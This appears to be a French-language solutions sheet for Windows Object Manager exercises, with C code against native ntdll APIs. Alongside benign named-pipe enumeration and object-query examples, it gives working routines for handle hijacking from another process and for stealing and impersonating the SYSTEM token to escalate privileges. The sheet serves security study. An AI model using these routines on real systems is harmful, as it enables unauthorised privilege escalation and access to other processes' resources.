# Solutions - Object Manager

## Note

Documentation du gestionnaire d'objets Windows pour la compréhension de l'architecture système et l'analyse de sécurité.

---

## Exercice 1 : Énumérer objets dans un directory

```c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef NTSTATUS (NTAPI *NtOpenDirectoryObject_t)(
    PHANDLE DirectoryHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS (NTAPI *NtQueryDirectoryObject_t)(
    HANDLE DirectoryHandle,
    PVOID Buffer,
    ULONG Length,
    BOOLEAN ReturnSingleEntry,
    BOOLEAN RestartScan,
    PULONG Context,
    PULONG ReturnLength
);

void enumerate_named_pipes() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    NtOpenDirectoryObject_t NtOpenDirectoryObject =
        (NtOpenDirectoryObject_t)GetProcAddress(hNtdll, "NtOpenDirectoryObject");
    NtQueryDirectoryObject_t NtQueryDirectoryObject =
        (NtQueryDirectoryObject_t)GetProcAddress(hNtdll, "NtQueryDirectoryObject");

    // Ouvrir \Device\NamedPipe
    UNICODE_STRING dirName;
    RtlInitUnicodeString(&dirName, L"\\Device\\NamedPipe");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &dirName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDirectory = NULL;
    NTSTATUS status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &objAttr);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenDirectoryObject failed: 0x%08X\n", status);
        return;
    }

    printf("[+] Named Pipes:\n\n");

    BYTE buffer[4096];
    ULONG context = 0;
    ULONG returnLength = 0;

    while (TRUE) {
        status = NtQueryDirectoryObject(hDirectory, buffer, sizeof(buffer),
                                        FALSE, FALSE, &context, &returnLength);

        if (!NT_SUCCESS(status)) break;

        POBJECT_DIRECTORY_INFORMATION pInfo = (POBJECT_DIRECTORY_INFORMATION)buffer;

        while (pInfo->Name.Length != 0) {
            wprintf(L"  %wZ (Type: %wZ)\n", &pInfo->Name, &pInfo->TypeName);
            pInfo++;
        }
    }

    CloseHandle(hDirectory);
}
```

---

## Exercice 2 : Dupliquer un handle

```c
HANDLE duplicate_handle_local(HANDLE hSource) {
    HANDLE hDuplicate = NULL;

    NTSTATUS status = NtDuplicateObject(
        NtCurrentProcess(),    // Source process
        hSource,               // Source handle
        NtCurrentProcess(),    // Target process
        &hDuplicate,           // Target handle
        0,                     // Desired access (0 = same)
        0,                     // Attributes
        DUPLICATE_SAME_ACCESS  // Options
    );

    if (NT_SUCCESS(status)) {
        printf("[+] Handle dupliqué: 0x%p → 0x%p\n", hSource, hDuplicate);
        return hDuplicate;
    }

    printf("[-] NtDuplicateObject failed: 0x%08X\n", status);
    return NULL;
}

// Dupliquer handle depuis autre processus (handle hijacking)
HANDLE steal_handle_from_process(DWORD sourcePID, HANDLE hSource) {
    OBJECT_ATTRIBUTES objAttr = {0};
    CLIENT_ID clientId = {(HANDLE)sourcePID, NULL};
    HANDLE hSourceProcess = NULL;

    // Ouvrir processus source
    NTSTATUS status = NtOpenProcess(&hSourceProcess,
                                    PROCESS_DUP_HANDLE,
                                    &objAttr,
                                    &clientId);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return NULL;
    }

    // Dupliquer handle dans notre processus
    HANDLE hDuplicate = NULL;
    status = NtDuplicateObject(
        hSourceProcess,        // Source process
        hSource,               // Source handle
        NtCurrentProcess(),    // Target process (nous)
        &hDuplicate,
        0,
        0,
        DUPLICATE_SAME_ACCESS
    );

    CloseHandle(hSourceProcess);

    if (NT_SUCCESS(status)) {
        printf("[+] Handle volé de PID %d: 0x%p\n", sourcePID, hDuplicate);
        return hDuplicate;
    }

    printf("[-] NtDuplicateObject failed: 0x%08X\n", status);
    return NULL;
}
```

---

## Exercice 3 : Interroger informations sur un objet

```c
typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[3];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

void query_handle_info(HANDLE hObject) {
    OBJECT_BASIC_INFORMATION basicInfo = {0};
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryObject(hObject,
                                    ObjectBasicInformation,
                                    &basicInfo,
                                    sizeof(basicInfo),
                                    &returnLength);

    if (NT_SUCCESS(status)) {
        printf("[+] Object Info:\n");
        printf("    Attributes:     0x%08X\n", basicInfo.Attributes);
        printf("    GrantedAccess:  0x%08X\n", basicInfo.GrantedAccess);
        printf("    HandleCount:    %u\n", basicInfo.HandleCount);
        printf("    PointerCount:   %u\n", basicInfo.PointerCount);

        // Décoder GrantedAccess pour processus
        if (basicInfo.GrantedAccess & PROCESS_ALL_ACCESS) {
            printf("    → PROCESS_ALL_ACCESS\n");
        }
        if (basicInfo.GrantedAccess & PROCESS_VM_WRITE) {
            printf("    → PROCESS_VM_WRITE\n");
        }
        if (basicInfo.GrantedAccess & PROCESS_VM_READ) {
            printf("    → PROCESS_VM_READ\n");
        }
    } else {
        printf("[-] NtQueryObject failed: 0x%08X\n", status);
    }
}
```

---

## Exercice 4 : Token Stealing (élévation de privilèges)

```c
BOOL steal_system_token() {
    printf("[*] Tentative de vol de token SYSTEM...\n");

    // 1. Trouver processus SYSTEM (ex: winlogon.exe)
    // Simplification: utiliser PID connu ou énumération
    DWORD systemPID = 4; // System process

    // 2. Ouvrir processus SYSTEM
    OBJECT_ATTRIBUTES objAttr = {0};
    CLIENT_ID clientId = {(HANDLE)systemPID, NULL};
    HANDLE hSystemProcess = NULL;

    NTSTATUS status = NtOpenProcess(&hSystemProcess,
                                    PROCESS_QUERY_INFORMATION,
                                    &objAttr,
                                    &clientId);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return FALSE;
    }

    printf("[+] Processus SYSTEM ouvert\n");

    // 3. Ouvrir token du processus SYSTEM
    HANDLE hSystemToken = NULL;
    status = NtOpenProcessToken(hSystemProcess, TOKEN_DUPLICATE, &hSystemToken);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcessToken failed: 0x%08X\n", status);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    printf("[+] Token SYSTEM récupéré\n");

    // 4. Dupliquer token
    HANDLE hDuplicatedToken = NULL;
    SECURITY_QUALITY_OF_SERVICE sqos = {
        sizeof(sqos),
        SecurityImpersonation,
        SECURITY_DYNAMIC_TRACKING,
        FALSE
    };

    OBJECT_ATTRIBUTES tokenAttr = {0};
    tokenAttr.Length = sizeof(tokenAttr);
    tokenAttr.SecurityQualityOfService = &sqos;

    status = NtDuplicateToken(hSystemToken,
                              TOKEN_ALL_ACCESS,
                              &tokenAttr,
                              FALSE,
                              TokenImpersonation,
                              &hDuplicatedToken);

    if (!NT_SUCCESS(status)) {
        printf("[-] NtDuplicateToken failed: 0x%08X\n", status);
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    printf("[+] Token dupliqué\n");

    // 5. Impersonate avec le token SYSTEM
    status = NtSetInformationThread(NtCurrentThread(),
                                    ThreadImpersonationToken,
                                    &hDuplicatedToken,
                                    sizeof(HANDLE));

    if (NT_SUCCESS(status)) {
        printf("[+] Token SYSTEM appliqué ! Vous êtes maintenant SYSTEM.\n");

        // Vérification
        HANDLE hCurrentToken;
        OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hCurrentToken);

        // Afficher infos token
        CloseHandle(hCurrentToken);
    }

    // Cleanup
    CloseHandle(hDuplicatedToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);

    return NT_SUCCESS(status);
}
```

---

## Points clés

- **Handles** = indices dans Handle Table, validation accès par Object Manager
- **Object Namespace** = hiérarchie (\Device, \Driver, \BaseNamedObjects)
- **Handle Hijacking** = dupliquer handle d'un processus privilégié
- **Token Stealing** = voler token SYSTEM pour élévation
- **Named Pipes** = vecteur d'attaque via impersonation
- Nécessite privilèges (SeDebugPrivilege) pour certaines opérations
